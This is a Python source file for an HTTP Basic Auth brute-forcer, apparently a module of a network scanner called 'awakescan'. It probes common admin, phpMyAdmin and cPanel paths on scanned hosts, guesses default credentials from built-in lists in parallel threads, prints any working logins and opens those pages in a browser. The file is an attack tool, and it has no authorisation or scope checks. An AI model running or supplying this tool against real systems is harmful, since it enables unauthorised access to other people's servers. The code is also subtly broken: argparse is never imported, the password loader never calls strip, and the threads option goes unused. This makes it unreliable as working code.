#!/usr/bin/env python3
"""
http_universal_bruter.py
------------------------
Universal HTTP Basic Auth discovery and bruteforce module for awakescan.

Features:
- Scans host reports for HTTP/HTTPS services
- Probes common admin/management paths to find Basic Auth challenges
- Detects valid Basic Auth prompts (401 + WWW-Authenticate header)
- Attempts bruteforce against detected auth using wordlists
- Automatically opens successful admin pages in the browser
"""

import json
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin

import requests
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout

# Default credentials to try
DEFAULT_USERNAMES = ["admin", "root", "user", "guest", "test", "administrator", "operator", "manager", "service", "support"]
DEFAULT_PASSWORDS = ["admin", "root", "password", "123456", "guest", "test", "1234", "12345", "default", "password123", "admin123", "root123", "toor", "pass", "secret", "login", "welcome", "system", "operator", "manager"]

# Paths to probe for auth - STRICTLY LIMITED, NO LOOPS
AUTH_PATHS = [
    "", "/admin", "/administrator", "/login", "/auth", "/authenticate",
    "/secure", "/manager", "/console", "/wp-admin", "/wp-login.php",
    "/phpmyadmin", "/pma", "/myadmin", "/mysql", "/sqladmin", "/sql",
    "/db", "/database", "/webadmin", "/system", "/control", "/panel",
    "/cpanel", "/whm", "/remote", "/cgi-bin", "/mifs"  # Single mifs entry
]


@dataclass
class BruteResult:
    """Result of a bruteforce attempt."""
    url: str
    username: str
    password: str
    success: bool
    status_code: int = 0
    error: Optional[str] = None


class UniversalHTTPBruter:
    """HTTP Basic Auth bruteforce scanner."""

    def __init__(self, usernames: List[str] = None, passwords: List[str] = None,
                 timeout: float = 10.0, max_workers: int = 10,
                 auto_open: bool = True):
        self.usernames = usernames or DEFAULT_USERNAMES
        self.passwords = passwords or DEFAULT_PASSWORDS
        self.timeout = timeout
        self.max_workers = max_workers
        self.auto_open = auto_open
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.0'
        })
        self.found_endpoints: Set[str] = set()
        self.successful_results: List[BruteResult] = []

    def probe_for_auth(self, base_url: str) -> List[str]:
        """Probe paths to find Basic Auth endpoints."""
        auth_urls = []  # List to store confirmed auth URLs

        for path in AUTH_PATHS:
            test_url = urljoin(base_url, path)
            if test_url in self.found_endpoints:
                continue

            try:
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                # Check for Basic Auth challenge (401 + WWW-Authenticate: Basic)
                if resp.status_code == 401:
                    www_auth = resp.headers.get('WWW-Authenticate', '').lower()
                    if 'basic' in www_auth:
                        auth_urls.append(test_url)
                        self.found_endpoints.add(test_url)
                        print(f"[+] Found Basic Auth at: {test_url}")

            except (RequestException, Timeout, Exception):
                continue  # Host down, path doesn't exist, network error, etc.

        return auth_urls

    def try_credentials(self, url: str, username: str, password: str) -> Optional[BruteResult]:
        """Attempt login with specific credentials."""
        try:
            resp = self.session.get(
                url,
                auth=HTTPBasicAuth(username, password),
                timeout=self.timeout
            )

            # If we get 200 OK, credentials worked
            if resp.status_code == 200:
                result = BruteResult(
                    url=url,
                    username=username,
                    password=password,
                    success=True,
                    status_code=resp.status_code
                )

                print(f"[+] SUCCESS: {url} -> {username}:{password}")

                if self.auto_open:
                    webbrowser.open_new_tab(url)

                return result

        except (RequestException, Timeout) as e:
            return BruteResult(
                url=url,
                username=username,
                password=password,
                success=False,
                error=str(e)
            )

        return None

    def bruteforce_url(self, url: str) -> List[BruteResult]:
        """Bruteforce a single URL with all credential combinations."""
        results = []
        total = len(self.usernames) * len(self.passwords)
        print(f"[*] Bruteforcing {url} ({total} combinations)...")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self.try_credentials, url, u, p): (u, p)
                for u in self.usernames
                for p in self.passwords
            }

            for future in as_completed(futures):
                result = future.result()
                if result and result.success:
                    results.append(result)
                    # Continue to find all valid creds, or break here for first-only

        return results

    def scan_host(self, host: str, ports: List[int]) -> List[BruteResult]:
        """Scan a single host for HTTP Basic Auth and bruteforce."""
        all_results = []

        # Check common HTTP/HTTPS ports
        http_ports = [p for p in ports if p in [80, 8080, 8000, 8888, 8081, 9000]]
        https_ports = [p for p in ports if p in [443, 8443, 9443]]

        base_urls = []
        for port in http_ports:
            base_urls.append(f"http://{host}:{port}")
        for port in https_ports:
            base_urls.append(f"https://{host}:{port}")

        # Probe each base URL for auth endpoints
        for base_url in base_urls:
            auth_urls = self.probe_for_auth(base_url)

            # Bruteforce each found auth endpoint
            for auth_url in auth_urls:
                results = self.bruteforce_url(auth_url)
                all_results.extend(results)

        return all_results


def brute_hosts_from_scan(scan_results: List[Dict],
                          usernames: List[str] = None,
                          passwords: List[str] = None,
                          auto_open: bool = True) -> List[BruteResult]:
    """
    Run bruteforce against hosts from scan results.

    Args:
        scan_results: List of host report dicts from awakescan
        usernames: Custom username list (uses defaults if None)
        passwords: Custom password list (uses defaults if None)
        auto_open: Whether to open successful URLs in browser

    Returns:
        List of successful BruteResult objects
    """
    bruter = UniversalHTTPBruter(
        usernames=usernames,
        passwords=passwords,
        auto_open=auto_open
    )

    all_results = []

    for host_data in scan_results:
        ip = host_data.get('ip')
        open_ports = host_data.get('open_ports', [])

        print(f"\n[*] Scanning {ip}...")
        results = bruter.scan_host(ip, open_ports)
        all_results.extend(results)

    print(f"\n[*] Complete. Found {len(all_results)} valid credentials.")
    return all_results


def main():
    """CLI entry point."""
    parser = argparse.ArgumentParser(description='HTTP Basic Auth Bruteforcer')
    parser.add_argument('--input', '-i', required=True, help='JSON scan results file')
    parser.add_argument('--usernames', '-u', help='Username wordlist file')
    parser.add_argument('--passwords', '-p', help='Password wordlist file')
    parser.add_argument('--no-open', action='store_true', help='Do not auto-open browser')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Worker threads')

    args = parser.parse_args()

    # Load scan results
    with open(args.input) as f:
        scan_results = json.load(f)

    # Load wordlists if provided
    usernames = None
    passwords = None

    if args.usernames:
        with open(args.usernames) as f:
            usernames = [l.strip() for l in f if l.strip()]

    if args.passwords:
        with open(args.passwords) as f:
            passwords = [l.strip for l in f if l.strip]

    # Run bruteforce
    results = brute_hosts_from_scan(
        scan_results,
        usernames=usernames,
        passwords=passwords,
        auto_open=not args.no_open
    )

    # Output results
    if results:
        print("\n[+] Successful credentials:")
        for r in results:
            print(f"    {r.url} -> {r.username}:{r.password}")
    else:
        print("\n[-] No valid credentials found.")


if __name__ == '__main__':
    main()
